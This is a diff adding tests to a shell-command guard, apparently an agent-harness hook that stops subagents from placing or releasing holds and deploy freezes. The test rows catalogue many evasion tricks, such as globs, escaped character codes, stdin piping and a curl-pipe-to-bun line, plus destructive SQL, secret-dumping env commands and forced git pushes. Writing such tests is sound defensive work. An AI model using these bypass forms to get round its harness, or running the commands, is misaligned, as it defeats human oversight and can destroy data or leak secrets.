@@ -1328,3 +1328,779 @@ describe("bash-guard allows mentioning CHECK_IDLE_FORCE without setting it", () 
     expect(await decide(command)).toBe("allow");
   });
 });
+
+// 保留(hold)を置く・解除する操作は、subagentに許さない。許すのは一覧(list)だけである。
+// ベストエフォートの規則で、別名の呼び出しや、変数で組んだパスは止めない。
+describe("bash-guard denies a subagent that places or releases a hold", () => {
+  test.each([
+    "bun scripts/hold.ts place --scope merge --target acme/widgets --minutes 5 --reason x",
+    "bun ./scripts/hold.ts release 1",
+    "bun run scripts/hold.ts place",
+    "bun run ./scripts/hold.ts release 3",
+    "bun /Users/someone/ws/atelier-works/scripts/hold.ts place",
+    "bun scripts/hold.ts",
+    "bun scripts/hold.ts --help",
+    "bun scripts/hold.ts -- place",
+    "bun scripts/hold.ts list; bun scripts/hold.ts place",
+    "bun scripts/hold.ts list && bun scripts/hold.ts release 1",
+    "bunx tsx scripts/hold.ts place",
+    "bun x tsx scripts/hold.ts place",
+    "npx tsx scripts/hold.ts place",
+    "node scripts/hold.ts place",
+    "node --experimental-strip-types scripts/hold.ts place",
+    "tsx scripts/hold.ts place",
+    "deno run scripts/hold.ts place",
+    "deno run -A scripts/hold.ts release 2",
+    "env FOO=1 bun scripts/hold.ts place",
+    "timeout 30 bun scripts/hold.ts place",
+    "sh -c 'bun scripts/hold.ts place'",
+    "bash -lc 'bun ./scripts/hold.ts release 1'",
+    "echo 'bun scripts/hold.ts place' | sh",
+    "mise exec -- bun scripts/hold.ts place",
+    "mise x -- bun scripts/hold.ts release 1",
+    "mise run hold:place",
+    "mise run hold:place -- --scope merge --target a/b --minutes 5 --reason x",
+    "mise run hold:release -- 1",
+    "mise r hold:place",
+    "mise r hold:release -- 1",
+    "mise hold:place",
+    "mise hold:release 1",
+    "mise tasks run hold:release -- 3",
+    "mise tasks r hold:place",
+    "mise run lint ::: hold:place",
+    "mise -C /repo run hold:place",
+    "mise run 'hold:*'",
+    "mise run hold:*",
+    "mise run 'hold:rel*'",
+    "mise run '*'",
+    'mise run "$TASK"',
+    'mise run hold:"$ACTION"',
+    "bun -e \"import {placeHold} from './f/factory/lib/holds.ts'; import {createHoldPsqlClient} from './scripts/hold_psql.ts'; console.log(placeHold, createHoldPsqlClient)\"",
+    "bun -e \"import './scripts/hold_psql.ts'\"",
+    "bun run - < scripts/hold.ts",
+    "bun run - place < ./scripts/hold.ts",
+    "cat scripts/hold.ts | bun --cwd scripts run - place --scope merge --target a/b --minutes 5 --reason x",
+    'bun run - place <<< "$(cat scripts/hold.ts)"',
+    "bun run - place < <(cat scripts/hold.ts)",
+    "cat scripts/hold.ts | node -",
+    "cat < scripts/hold.ts | bun --cwd scripts run - place --scope merge --target a/b --minutes 5 --reason x",
+    'cat <<< "$(cat scripts/hold.ts)" | bun run - place',
+    "bun --eval \"await import('./f/factory/lib/holds.ts')\"",
+    "node -e \"require('./scripts/hold_psql.ts')\"",
+    "deno eval \"import './scripts/hold.ts'\"",
+    "bun -p \"import('./scripts/hold.ts')\"",
+    "bun run - <<'EOF'\nimport './f/factory/lib/holds.ts';\nEOF",
+    'docker compose -f infra/docker-compose.yml exec -T db psql -U postgres -d datatable_db -c "UPDATE factory.holds SET released_at = now()"',
+    "docker compose exec db psql -c 'DELETE FROM factory.holds'",
+    "docker-compose exec db psql -c 'TRUNCATE factory.holds'",
+    "docker-compose -f infra/docker-compose.yml exec -T db psql -c 'UPDATE factory.holds SET x = 1'",
+    'psql -c "UPDATE factory.holds SET released_at = now()"',
+    "psql -d datatable_db -f /tmp/holds.sql",
+    "docker compose exec -T db psql -U postgres -f /tmp/holds.sql",
+    'echo "UPDATE factory.holds SET released_at = now()" | docker compose exec -T db psql -U postgres -d datatable_db',
+    "printf 'DELETE FROM factory.holds' | psql",
+    "docker compose exec -T db psql -U postgres <<'SQL'\nUPDATE factory.holds SET released_at = now();\nSQL",
+    "psql <<<'DELETE FROM factory.holds'",
+    "mise exec -- psql -c 'UPDATE factory.holds SET x = 1'",
+    "sh -c \"psql -c 'UPDATE factory.holds SET x = 1'\"",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+
+  test("the reason tells the subagent to ask the main session or a person", async () => {
+    expect(
+      await denyReason("bun scripts/hold.ts place", { subagent: true }),
+    ).toContain("main session");
+  });
+
+  test("the reason is the same for the mise task", async () => {
+    expect(
+      await denyReason("mise run hold:release -- 1", { subagent: true }),
+    ).toContain("must not place or release holds");
+  });
+});
+
+describe("bash-guard allows a subagent to list holds and to work on the hold code", () => {
+  test.each([
+    "bun scripts/hold.ts list",
+    "bun ./scripts/hold.ts list",
+    "bun run scripts/hold.ts list",
+    "bun /Users/someone/ws/atelier-works/scripts/hold.ts list",
+    "node scripts/hold.ts list",
+    "mise exec -- bun scripts/hold.ts list",
+    "mise run hold:list",
+    "mise r hold:list",
+    "mise hold:list",
+    "mise tasks run hold:list",
+    "mise run freeze:list",
+    "mise run check",
+    "mise run test:db",
+    "mise run lint ::: typecheck",
+    "bun test tests/scripts/hold.test.ts",
+    "bun test tests/scripts/hold_psql.test.ts tests/scripts/hold_wiring.test.ts",
+    "bun test tests/lib/holds.test.ts",
+    "bunx biome check scripts/hold.ts",
+    "bunx biome check scripts/hold.ts scripts/hold_psql.ts f/factory/lib/holds.ts",
+    "bunx tsc --noEmit scripts/hold.ts",
+    "bun run scripts/lint-no-type-assertions.ts scripts/hold.ts",
+    "bun x biome check scripts/hold.ts",
+    "git add scripts/hold.ts scripts/hold_psql.ts",
+    "git diff -- f/factory/lib/holds.ts",
+    "git commit -m 'feat: scripts/hold.ts place と release'",
+    "cat scripts/hold.ts",
+    "grep -n holds docs/internals/holds.md",
+    "rg 'factory.holds' f",
+    "docker compose ps",
+    "docker compose -f infra/docker-compose.yml exec -T db psql -U postgres -d datatable_db -c 'SELECT 1'",
+    "docker compose exec db psql -c 'SELECT count(*) FROM factory.work_items'",
+    "psql --version",
+    "echo 'SELECT 1' | docker compose exec -T db psql -U postgres",
+    "echo 'hold.ts place is for the main session'",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("allow");
+  });
+});
+
+describe("bash-guard leaves the main session free to place and release holds", () => {
+  test.each([
+    "bun scripts/hold.ts place --scope merge --target acme/widgets --minutes 5 --reason x",
+    "bun ./scripts/hold.ts release 1",
+    "mise run hold:place",
+    "mise run hold:release -- 1",
+    "mise r hold:place",
+    "mise exec -- bun scripts/hold.ts place",
+    "sh -c 'bun scripts/hold.ts place'",
+    "bun -e \"import './scripts/hold_psql.ts'\"",
+    "docker compose exec db psql -c 'UPDATE factory.holds SET x = 1'",
+    "psql -f /tmp/holds.sql",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("allow");
+  });
+});
+
+// deployの保留(`freeze:place --scope deploy`)を置くことと、凍結の解除(`freeze:release`)は、subagentに許さない。
+// スケジュールの凍結を置くこと(`--scope`なし、または`--scope schedule`)と、一覧と検査は許す。
+describe("bash-guard denies a subagent that places a deploy freeze or releases a freeze", () => {
+  test.each([
+    "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
+    "mise run freeze:place -- --minutes 60 --reason x --scope deploy",
+    "mise run freeze:place -- --scope=deploy --minutes 60 --reason x",
+    "mise run freeze:place -- --scope DEPLOY --minutes 60 --reason x",
+    "mise r freeze:place -- --scope deploy --minutes 60 --reason x",
+    "mise freeze:place --scope deploy --minutes 60 --reason x",
+    "mise tasks run freeze:place -- --scope deploy --minutes 60 --reason x",
+    "mise -C /repo run freeze:place -- --scope deploy --minutes 60 --reason x",
+    "mise run freeze:place -- --scope $SCOPE --minutes 60 --reason x",
+    'mise run freeze:place -- --scope "$(echo deploy)" --minutes 60 --reason x',
+    "mise run freeze:place -- --scope dep* --minutes 60 --reason x",
+    "mise run freeze:release -- d0a1b2c3",
+    "mise r freeze:release -- 1",
+    "mise freeze:release 1",
+    "mise tasks run freeze:release -- 1",
+    "mise run 'freeze:*'",
+    "mise run freeze:rel*",
+    "mise run freeze:place ::: freeze:release",
+    "bun scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
+    "bun ./scripts/freeze.ts release d0a1b2c3",
+    "bun run scripts/freeze.ts release 1",
+    "bun scripts/freeze release 1",
+    "bun /Users/someone/ws/atelier-works/scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
+    "node scripts/freeze.ts release 1",
+    "bunx tsx scripts/freeze.ts release 1",
+    "./scripts/freeze.ts release 1",
+    "mise exec -- bun scripts/freeze.ts release 1",
+    "sh -c 'bun scripts/freeze.ts release 1'",
+    "bun scripts/freeze.ts list; bun scripts/freeze.ts release 1",
+    "bun scripts/freeze.ts $ACTION",
+    "bun scripts/freeze.ts place --scope $SCOPE --minutes 60 --reason x",
+    "bun scripts/freeze.ts -- release 1",
+    "bun scripts/freeze.ts -- -- release 1",
+    "bun scripts/freeze.ts -- place --scope deploy --minutes 60 --reason x",
+    "bun run scripts/freeze.ts -- release 1",
+    "bun run scripts/fre?ze.ts release 1",
+    "bun run scripts/fr*e.ts release 1",
+    "bun fr*e.ts place --scope deploy --minutes 60 --reason x",
+    "bun scripts/fre[a-z]ze.ts release 1",
+    "bun scripts/fre[[:alpha:]]ze.ts release 1",
+    "bun run scripts/* release 1",
+    "./scripts/fre?ze.ts release 1",
+    "bun --preload ./scripts/freeze.ts scripts/freeze.ts release 1",
+    "bun scripts/freeze.ts list scripts/freeze.ts release 1",
+    "bun -e \"await Bun.spawn(['bun','scripts/freeze.ts','release','1'])\"",
+    "bun run - <<'EOF'\nimport './scripts/freeze.ts'; process.argv.push('release');\nEOF",
+    "echo 'release 1' | bun scripts/freeze.ts $(cat)",
+    "bun run - list < scripts/freeze.ts",
+    "bun run - list < ./scripts/freeze.ts",
+    "bun run - < scripts/fre?ze.ts",
+    "node - < scripts/freeze.ts",
+    "cat scripts/freeze.ts | bun --cwd scripts run - place --scope deploy --minutes 120 --reason x",
+    "cat scripts/freeze.ts | bun run - place --scope deploy --minutes 5 --reason x",
+    "cat scripts/freeze.ts | bun run - release 1",
+    'bun run - release 1 <<< "$(cat scripts/freeze.ts)"',
+    'bun run - release 1 <<< "$(cat $FILE)"',
+    "bun run - release 1 < <(cat scripts/freeze.ts)",
+    "curl -s http://example.test/x.ts | bun run - release 1",
+    "echo \"import './scripts/freeze.ts'\" | bun run - release 1",
+    "echo $CODE | bun run - release 1",
+    "cat $FILE | bun run - release 1",
+    "cat < scripts/freeze.ts | bun --cwd scripts run - release 1",
+    'cat <<< "$(cat scripts/freeze.ts)" | bun --cwd scripts run - release 1',
+    "cat <<EOF | bun run - release 1\nimport $X\nEOF",
+    'cat < "$FILE" | bun run - release 1',
+    "cat < scripts/freeze.ts | bun run /dev/stdin release 1",
+    "cat < scripts/freeze.ts | bun run /dev/fd/0 release 1",
+    "cat < scripts/freeze.ts | bun run /proc/self/fd/0 release 1",
+    "bun run /dev/fd/0 release 1 < scripts/freeze.ts",
+    "bun run x.ts < <(echo hi)",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+
+  test("the reason names the deploy freeze", async () => {
+    expect(
+      await denyReason(
+        "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
+        { subagent: true },
+      ),
+    ).toContain("deploy freeze");
+  });
+
+  test("the reason is the hold reason for releasing a freeze", async () => {
+    expect(
+      await denyReason("mise run freeze:release -- 1", { subagent: true }),
+    ).toContain("main session");
+  });
+});
+
+describe("bash-guard allows a subagent to place a schedule freeze and to list freezes", () => {
+  test.each([
+    "mise run freeze:list",
+    "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason verify",
+    "mise run freeze:place -- --scope schedule --target f/factory/collect_github --minutes 30 --reason verify",
+    "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason 'check the deploy'",
+    "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason deploy",
+    "mise run push:dry",
+    "mise run check",
+    "bun scripts/freeze.ts list",
+    "bun scripts/freeze.ts check",
+    "bun scripts/freeze.ts -- list",
+    'bun test tests/scripts/freeze.test.ts -t "deploy freeze"',
+    "bun test --test-name-pattern 'deploy freeze'",
+    'bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason "deploy freeze"',
+    'bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason "release the freeze.ts later"',
+    "bun run - < /tmp/input.ts",
+    "cat /tmp/input.ts | bun run -",
+    "cat < /tmp/input.ts | bun run -",
+    "cat <<'EOF' | bun run -\nconsole.log(1)\nEOF",
+    "cat package.json | bun run - list",
+    "echo 'console.log(1)' | bun run -",
+    "echo \"import './scripts/freeze.ts'\" | bun run - list",
+    "bun test",
+    "bunx biome check scripts/fre?ze.ts",
+    "bun -e \"import './scripts/freeze.ts'\"",
+    "bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason r",
+    "bun test tests/scripts/freeze.test.ts tests/lib/freezes.test.ts",
+    "bun test tests/scripts/freeze_wiring.test.ts",
+    "bunx biome check scripts/freeze.ts",
+    "bunx tsc --noEmit scripts/freeze.ts",
+    "git add scripts/freeze.ts f/factory/lib/freezes.ts",
+    "git diff -- scripts/freeze.ts",
+    "cat scripts/freeze.ts",
+    "grep -n release scripts/freeze.ts",
+    "echo 'freeze.ts release is for the main session'",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("allow");
+  });
+});
+
+describe("bash-guard leaves the main session free to place a deploy freeze and release a freeze", () => {
+  test.each([
+    "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
+    "mise run freeze:release -- d0a1b2c3",
+    "bun scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
+    "bun scripts/freeze.ts release d0a1b2c3",
+    "mise exec -- bun scripts/freeze.ts release 1",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("allow");
+  });
+});
+
+// `mise generate`のうち、フックやワークフローのファイルへ書く形は拒否する。
+describe("bash-guard denies mise generate that writes hook or workflow files", () => {
+  test.each([
+    "mise generate git-pre-commit --write",
+    "mise generate git-pre-commit -w",
+    "mise generate github-action --write",
+    "mise generate github-action -w --name ci",
+    "mise -q generate github-action --write",
+    "mise g git-pre-commit --write",
+    "mise gen git-pre-commit --write",
+    "mise generate pre-commit --write",
+    "mise generate pre-commit -w",
+    "mise generate git-pre-commit -wt pre-push",
+    "mise generate git-pre-commit --hook pre-push --write",
+    "mise generate github-action -wn ci",
+    "mise generate github-action -tw ci",
+    "mise gen github-action --write",
+    "sh -c 'mise generate git-pre-commit --write'",
+    "mise exec -- mise generate git-pre-commit --write",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+
+  test("the reason says that the hooks and workflows are not for writing", async () => {
+    expect(await denyReason("mise generate git-pre-commit --write")).toContain(
+      ".git/hooks",
+    );
+  });
+});
+
+describe("bash-guard allows mise generate that only prints", () => {
+  test.each([
+    "mise generate git-pre-commit",
+    "mise generate github-action",
+    "mise generate task-docs",
+    "mise generate github-action --name ci",
+    "mise generate git-pre-commit --hook pre-push",
+    "mise generate git-pre-commit -t pre-commit",
+    "mise generate github-action -t ci",
+    "mise generate --help",
+    "mise generate git-pre-commit --help",
+    "mise generate github-action --help",
+    "mise gen pre-commit",
+    "mise run check",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("allow");
+  });
+});
+
+// 値を取るオプションを読み飛ばさずに、保留の操作を拒否する。
+describe("bash-guard denies a subagent that hides a hold operation behind options", () => {
+  test.each([
+    "mise run --timeout 5m hold:release -- 3",
+    "mise run -o prefix hold:place",
+    "mise run --unknown-option hold:place",
+    "mise run -j 2 hold:release 4",
+    "mise tasks run -j 2 hold:place",
+    "mise t run hold:place",
+    "mise watch hold:place",
+    "mise w hold:place",
+    'mise watch "$TASK"',
+    'mise t run "$TASK"',
+    "mise run lint hold:place",
+    "mise run test -- hold:place",
+    "mise x -- mise run -o keep hold:release 1",
+    "bun --preload ./x.ts scripts/hold.ts place --scope merge",
+    "bun --preload test scripts/hold.ts place",
+    "bun --bun scripts/hold.ts place",
+    "bun --silent run scripts/hold.ts release 1",
+    "tsx --tsconfig tsconfig.json scripts/hold.ts release 1",
+    "deno run --import-map map.json scripts/hold.ts place",
+    "node --import tsx scripts/hold.ts place",
+    "bunx --bun tsx scripts/hold.ts place",
+    "bun exec 'bun scripts/hold.ts place --scope merge'",
+    'bun exec "mise run hold:place"',
+    "bun run scripts/hold place --scope merge --target a/b --minutes 5 --reason x",
+    "bun scripts/hold place",
+    "bun ./scripts/hold release 1",
+    "bun run scripts/hold_psql",
+    "bun scripts/hold_psql.ts",
+    "bun run f/factory/lib/holds",
+    "bun scripts/hold.ts --verbose list",
+    "./scripts/hold.ts place",
+    "scripts/hold.ts release 1",
+    "bun -e \"import './scripts/hold'\"",
+    "bun -e \"await import('../f/factory/lib/holds')\"",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+});
+
+describe("bash-guard keeps allowing inspection of the hold code", () => {
+  test.each([
+    "bun scripts/hold list",
+    "bun run scripts/hold list",
+    "bun test tests/scripts/hold.test.ts",
+    "bun test tests/lib/holds.test.ts tests/lib/holds_db.test.ts",
+    "bunx biome check scripts/hold.ts",
+    "bunx --bun biome check scripts/hold.ts scripts/hold_psql.ts",
+    "bunx tsc --noEmit scripts/hold.ts",
+    "bun run scripts/lint-no-type-assertions.ts scripts/hold.ts",
+    "bun run scripts/lint-docs.ts docs/internals/holds.md",
+    "mise -C /repo run check",
+    "mise run lint ::: typecheck",
+    "mise run hold:list",
+    "mise watch check",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("allow");
+  });
+});
+
+describe("bash-guard reads the script of bun exec as shell input", () => {
+  test.each([
+    "bun exec 'git push --force origin feature'",
+    "bun exec 'git push origin main'",
+    'bun exec "git commit --no-verify -m x"',
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+
+  test.each(["bun exec 'echo hello'", "bun exec 'git status'"])(
+    "%s",
+    async (command) => {
+      expect(await decide(command)).toBe("allow");
+    },
+  );
+});
+
+// glob、引用符の中の文字コード、miseの全体オプションで、保留の操作を隠す形を拒否する。
+describe("bash-guard denies a subagent that hides a hold operation behind a pattern", () => {
+  test.each([
+    "mise run h[o]ld:place",
+    "mise run 'hold:[pr]*'",
+    "mise run hold:[pr]*",
+    "mise run hold:rel[a-z]ase 1",
+    "mise run hold:[!l]*",
+    "mise run hold:pla?e",
+    "mise run hold:*",
+    "mise hold:place",
+    "mise hold:release 3",
+    "mise hold*",
+    "mise -q hold:place",
+    "bun scripts/hol?.ts place",
+    "bun scripts/hol[d].ts place",
+    "bun scripts/ho*.ts place",
+    "bun run scripts/*.ts",
+    "bun run f/factory/lib/hold?.ts",
+    "bun scripts/hol[!x].ts place",
+    "bun run ./scripts/hol?",
+    "bun $'scripts/hol\\x64.ts' place",
+    "bun $'scripts/hol\\144.ts' place",
+    "bun $'scripts/hol\\u0064.ts' place",
+    "bun $'scripts/hol\\U00000064.ts' place",
+    "mise run $'\\x68old:place'",
+    "mise run $'hold\\x3aplace'",
+    "mise run $'hold\\072release' 1",
+    "npm exec tsx scripts/hold.ts place",
+    "pnpm exec tsx scripts/hold.ts place",
+    "pnpx tsx scripts/hold.ts place",
+    "yarn tsx scripts/hold.ts place",
+    "yarn dlx tsx scripts/hold.ts release 1",
+    "npm run hold -- place",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+});
+
+describe("bash-guard denies a subagent that puts mise options before exec", () => {
+  test.each([
+    "mise -q exec -- bun scripts/hold.ts place",
+    "mise -q x -- bun scripts/hold.ts place",
+    "mise -v x -- bun scripts/hold.ts place",
+    "mise -vv x -- bun scripts/hold.ts place",
+    "mise -y exec -- bun scripts/hold.ts place",
+    "mise -C /repo x -- bun scripts/hold.ts release 1",
+    "mise --cd /repo exec -- bun scripts/hold.ts place",
+    "mise --cd=/repo exec -- bun scripts/hold.ts place",
+    "mise -E ci x -- bun scripts/hold.ts place",
+    "mise -P dev exec -- bun scripts/hold.ts place",
+    "mise -qy -C /repo x -- bun scripts/hold.ts place",
+    "mise --no-config x -- bun scripts/hold.ts place",
+    "mise -q -C /repo -E ci exec node@22 -- bun scripts/hold.ts place",
+    "mise -q run hold:place",
+    "mise -C /repo run hold:release 1",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+});
+
+describe("bash-guard keeps mise global options from hiding secrets", () => {
+  test.each([
+    "mise -q x -- env",
+    "mise -C /repo exec -- printenv",
+    "mise -y x -c 'echo hi'",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+
+  test.each(["mise -q x -- echo hi", "mise -C /repo exec -- git status"])(
+    "%s",
+    async (command) => {
+      expect(await decide(command)).toBe("allow");
+    },
+  );
+});
+
+describe("bash-guard reads the character codes of a quoted word", () => {
+  test.each([
+    "git $'\\x70ush' --force origin feature",
+    "git $'pu\\163h' origin main",
+    "git push $'--no-ver\\u0069fy'",
+    "git commit $'--no-verif\\x79' -m x",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+
+  test("an escaped word that is harmless is allowed", async () => {
+    expect(await decide("echo $'a\\x62c'")).toBe("allow");
+  });
+});
+
+describe("bash-guard allows work that only looks like a hold operation", () => {
+  test.each([
+    "mise run test:*",
+    "mise run test:unit",
+    "bun test tests/scripts/hold.test.ts",
+    "bun test tests/scripts/ho*.test.ts",
+    "mise -C /repo run check",
+    "mise -q run check",
+    "mise --cd /repo run lint",
+    "mise tasks info hold:place",
+    "mise tasks ls",
+    "mise t ls",
+    "bunx @biomejs/biome check scripts/hold.ts",
+    "npm test tests/scripts/hold.test.ts",
+    "pnpm exec biome check scripts/hold.ts",
+    "npx biome check scripts/hold.ts",
+    "bun run scripts/lint-docs.ts docs/*.md",
+    "mise -q x -- echo hi",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("allow");
+  });
+});
+
+describe("bash-guard says why a dynamic mise word is denied", () => {
+  test("the reason for a dynamic option value names the variable", async () => {
+    expect(await denyReason('mise -C "$DIR" run check')).toContain("variable");
+  });
+
+  test("the reason names the dynamic word", async () => {
+    expect(await denyReason('mise run "$TASK"', { subagent: true })).toContain(
+      "variable",
+    );
+  });
+
+  test("the reason for a held task names the hold tasks", async () => {
+    expect(
+      await denyReason("mise run hold:place", { subagent: true }),
+    ).toContain("hold:place");
+  });
+});
+
+describe("bash-guard denies mise generate that writes anywhere in the hook or workflow paths", () => {
+  test.each([
+    "mise generate task-docs -o .git/hooks/pre-commit",
+    "mise generate task-docs --output=.git/hooks/pre-push",
+    "mise generate task-docs --output .git/config",
+    "mise generate task-docs --output .github/workflows/ci.yml",
+    "mise generate task-docs -o=.github/workflows/ci.yml",
+    'mise generate task-docs -o "$OUT"',
+    "mise generate tool-stub -o .git/hooks/pre-commit",
+    'mise generate git-pre-commit "$FLAG"',
+    "mise -C /repo generate task-docs -o .git/hooks/commit-msg",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+
+  test.each([
+    "mise generate task-docs",
+    "mise generate task-docs -o docs/tasks.md",
+    "mise generate task-docs --inject --output README.md",
+    "mise generate config",
+  ])("%s is allowed", async (command) => {
+    expect(await decide(command)).toBe("allow");
+  });
+});
+
+// シェルが語を組み立てる形(文字クラス、ディレクトリの揺れ、NUL、$"、ブレース、=コマンド)で、保留の操作を隠す。
+describe("bash-guard denies a subagent that builds the hold code with a pattern", () => {
+  test.each([
+    "mise run hold:[[:lower:]]*",
+    "mise run hold:[[=p=]]lace",
+    "mise run 'hold:[[.p.]]lace'",
+    "bun scripts/hol[[:lower:]].ts place",
+    "bun scripts/[[.h.]]old.ts place",
+    "bun scripts//hol?.ts place",
+    "bun scripts/./hol?.ts place",
+    "bun scripts/x/../hol?.ts place",
+    "bun /abs/dir/hol?.ts place",
+    "bun ../hol?.ts place",
+    "bun run ./hol[d].ts",
+    "bun $'scripts/hold.ts\\0junk' place",
+    "bun $'scripts/hol\\x00d.ts' place",
+    "bun $'scripts/hol\\000d.ts' place",
+    "mise run $'hold:pla\\u0000ce'",
+    "mise run $'hold:place\\x00x'",
+    'mise run $"hold:place"',
+    'bun scripts/$"hold".ts place',
+    "bun --cwd scripts {hold.ts,place}",
+    "bun scripts/{hold,x}.ts place",
+    "bun run {scripts/hold.ts,x}",
+    "bun {a,scripts/hold}.ts place",
+    "bun h{old,x}.ts place",
+    "bun scripts/ho{ld,x}.ts place",
+    "=bun scripts/hold.ts place",
+    "=mise run hold:place",
+    "=env bun scripts/hold.ts place",
+    "=node scripts/hold.ts release 1",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+});
+
+describe("bash-guard denies a subagent that puts the options of mise in new places", () => {
+  test.each([
+    "mise --log-level debug exec -- bun scripts/hold.ts place",
+    "mise --output quiet x -- bun scripts/hold.ts place",
+    "mise -s bash x -- bun scripts/hold.ts place",
+    "mise --shell zsh exec -- bun scripts/hold.ts place",
+    "mise -t node x -- bun scripts/hold.ts place",
+    "mise --tool node@22 exec -- bun scripts/hold.ts place",
+    "mise -EC x -- bun scripts/hold.ts place",
+    "mise -qEC x -- bun scripts/hold.ts place",
+    "mise --future-flag value x -- bun scripts/hold.ts place",
+    "mise --future-flag run check",
+    "mise --future-flag value run hold:place",
+    "mise run x -- bun scripts/hold.ts place",
+    "mise run x bun scripts/hold.ts place",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+
+  test("the reason for an unknown option says to write a known one", async () => {
+    expect(
+      await denyReason("mise --future-flag run check", { subagent: true }),
+    ).toContain("option");
+  });
+});
+
+describe("bash-guard keeps the secret check working behind unknown mise options", () => {
+  test.each([
+    "mise --log-level debug x -- env",
+    "mise -s bash exec -- printenv",
+    "mise --future-flag value x -- env",
+    "mise -EC x -- env",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+
+  test.each([
+    "mise --log-level debug x -- echo hi",
+    "mise --future-flag=1 x -- echo hi",
+    "mise --future-flag run check",
+  ])("%s is allowed for the main session", async (command) => {
+    expect(await decide(command)).toBe("allow");
+  });
+});
+
+describe("bash-guard reads =command of zsh as the command", () => {
+  test.each(["=git push --force origin feature", "=git push origin main"])(
+    "%s",
+    async (command) => {
+      expect(await decide(command)).toBe("deny");
+    },
+  );
+
+  test("=git status is allowed", async () => {
+    expect(await decide("=git status")).toBe("allow");
+  });
+});
+
+describe("bash-guard allows work that only looks like a pattern", () => {
+  test.each([
+    "mise run check",
+    "mise run test -- -t '*'",
+    "mise run test -- -t 'ho*'",
+    'mise run test -- "$ARG"',
+    "mise -C /repo run check",
+    "mise -q x -- echo hi",
+    "mise --log-level debug run check",
+    "mise --future-flag=1 run check",
+    "bun test tests/scripts/hold.test.ts",
+    "bun test tests/scripts/{a,b}.test.ts",
+    "bun test tests/scripts/ho[[:lower:]]d.test.ts",
+    "bunx --bun biome check scripts/hold.ts",
+    "bunx @biomejs/biome@1.9.4 check scripts/hold.ts",
+    "npx --yes @biomejs/biome check scripts/hold.ts",
+    "npx -y biome check scripts/hold.ts",
+    "bun -e 'console.log({a:1})'",
+    'echo $"hi"',
+    "=bun test tests/scripts/hold.test.ts",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("allow");
+  });
+
+  test.each([
+    "mise run lint -- hold:place",
+    "mise run test -- hold:*",
+    "mise run test -- hold:release 3",
+  ])("%s stays denied after --", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+});
+
+describe("bash-guard compares the write path of mise generate loosely", () => {
+  test.each([
+    "mise generate task-docs -o .git//hooks/pre-commit",
+    "mise generate task-docs -o .git/./hooks/pre-commit",
+    "mise generate task-docs -o .GIT/Hooks/pre-commit",
+    "mise generate task-docs -o .Github/Workflows/ci.yml",
+    "mise generate task-docs -o ./.github/./workflows//ci.yml",
+    "mise -C .git/hooks generate task-docs -o pre-commit",
+    "mise --cd=.github/workflows generate task-docs",
+    "mise --cd .git/hooks generate task-docs",
+    'mise -C "$DIR" generate task-docs',
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+
+  test("a harmless write path is allowed", async () => {
+    expect(await decide("mise generate task-docs -o docs//tasks.md")).toBe(
+      "allow",
+    );
+  });
+});
+
+// 括弧の中のPOSIX文字クラスと、zshのglobのまとまりと、生成先のglobで、拒否を逃れない。
+describe("bash-guard denies a subagent that hides the hold code in a class or a group", () => {
+  test.each([
+    "bun scripts/hol[![:upper:]].ts place",
+    "bun scripts/hol[^[:upper:]].ts place",
+    "bun scripts/[![=x=]]old.ts place",
+    "bun scripts/hol[a[.d.]].ts place",
+    "mise run hold:[!a[:upper:]]*",
+    "bun scripts/(ho)ld.ts place",
+    "bun scripts/hol(d).ts place",
+    "bun (ho)ld.ts place",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("deny");
+  });
+});
+
+describe("bash-guard keeps allowing parentheses that are not a glob group", () => {
+  test.each([
+    "arr=(a b)",
+    "f() { :; }",
+    "f () { :; }",
+    "(echo hi && ls)",
+    "if (true); then echo hi; fi",
+    "! (false)",
+    "for ((i=0;i<3;i++)); do :; done",
+    "echo $(date)",
+    "diff <(echo a) <(echo b)",
+    "echo a | (cat)",
+  ])("%s", async (command) => {
+    expect(await decide(command, { subagent: true })).toBe("allow");
+  });
+});
+
+describe("bash-guard denies mise generate whose write path is a pattern", () => {
+  test.each([
+    "mise generate task-docs -o docs/*.md",
+    "mise generate task-docs -o docs/{a,b}.md",
